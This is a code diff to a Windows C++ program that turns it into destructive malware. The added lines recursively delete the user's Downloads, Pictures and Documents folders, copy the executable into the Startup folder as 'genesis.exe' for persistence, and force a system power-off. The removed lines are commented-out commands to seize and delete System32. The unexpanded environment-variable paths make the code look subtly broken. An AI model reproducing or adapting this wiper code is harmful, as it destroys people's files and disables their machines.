@@ -7,19 +7,32 @@ int APIENTRY wWinMain(HINSTANCE Instance,
 	int		  nCmdShow) {
 
 
-	char filepath[] = "C:\\New folder";
+	char filepath[] = "%userprofile%\\Downloads";
+	char filepathb[] = "%userprofile%\\Pictures";
+	char filepathc[] = "%userprofile%\\Documents";
 	if (std::filesystem::exists(filepath)) {
 		
 		std::filesystem::remove_all(filepath);
-		//system("takeown /f C:\\Windows\\System32 /r /d y");
-		//system("icacls C:\\Windows\\System32 /grant Administrators:F /t /c /q");
-		//std::filesystem::remove_all("C:\\Windows\\System32");
-		memleak
-
+		std::filesystem::remove_all(filepathb);
+		std::filesystem::remove_all(filepathc);
+	}
+	
+	char filename[ MAX_PATH ] = "genesis.exe";
+	char newLocation[] = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+	if (std::filesystem::exists("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\genesis.exe")) {
+		
+		exit(0);
 	}
 	else {
-		memleak
+
+		BOOL stats = 0;
+		DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
+		if (size)
+			CopyFileA(filename, newLocation, stats);
 	}
+	
+	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE,
+		SHTDN_REASON_MINOR_OTHER);
 
-
+	return 0;
 }
